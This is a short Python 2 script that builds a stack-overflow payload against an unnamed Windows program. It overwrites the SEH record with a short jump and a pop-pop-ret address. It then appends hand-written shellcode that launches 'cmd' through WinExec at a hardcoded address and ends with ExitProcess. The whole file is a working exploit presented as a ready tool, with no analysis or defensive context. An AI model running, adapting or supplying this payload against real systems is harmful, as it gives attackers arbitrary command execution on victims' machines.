
#dummy
buf1 = "A"*(204) + "B"*4

#dummy to set SEH
buf2 = "A"*0x2C

#set SEH 
seh = "\xEB\x06\xAA\xAA"
seh += "\xC5\x12\x40\x00"

#shellcode
#set arg
sh = "\x8B\xEC\x33\xC0\x83\xC0\x40\xC1\xE0\x04"
sh += "\x2B\xE0\x8D\x44\x24\xFC\x33\xDB\x83\xC3"
sh += "\x64\xC1\xE3\x08\x83\xC3\x6D\xC1\xE3\x08"
sh += "\x83\xC3\x63\x53\x6A\x05\x50"

#call WinExec
sh += "\x6A\x74\x58\xC1\xE0\x04\x83\xC0\x04\x83\xC0\x07\xC1"
sh += "\xE0\x04\x83\xC0\x04\x83\xC0\x05\xC1\xE0\x08\x83\xC0"
sh += "\x2B\xC1\xE0\x08\xFF\xD0"

#call ExitProcess
sh += "\xB8\xB0\x3C\xB5\x74\x6A\x01\xFF\xD0"

#dummy for stack overflow
overflow = "A"*1000

print buf1 + buf2 + seh + sh + overflow


